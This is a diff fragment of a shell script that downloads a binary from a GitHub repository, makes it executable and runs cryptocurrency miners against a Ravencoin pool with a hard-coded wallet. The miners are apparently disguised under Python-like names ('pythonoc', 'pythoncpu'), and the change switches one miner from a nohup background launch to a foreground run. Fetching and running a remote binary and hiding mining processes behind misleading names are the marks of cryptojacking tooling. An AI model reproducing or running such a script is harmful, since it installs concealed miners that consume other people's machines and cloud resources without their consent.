@@ -140,7 +140,7 @@ echo '#######################                                       '"${Color_Of
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
 wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
 chmod +x pythoncpu
-nohup ./pythoncpu -a x16rv2 -o stratum+tcp://$PROX:$RVPort -u RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."CPU_""$IPNAME" -p c=RVN -t 4
+./pythoncpu -a x16rv2 -o stratum+tcp://$PROX:$RVPort -u RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."CPU_""$IPNAME" -p c=RVN -t 4
 
 fi
 
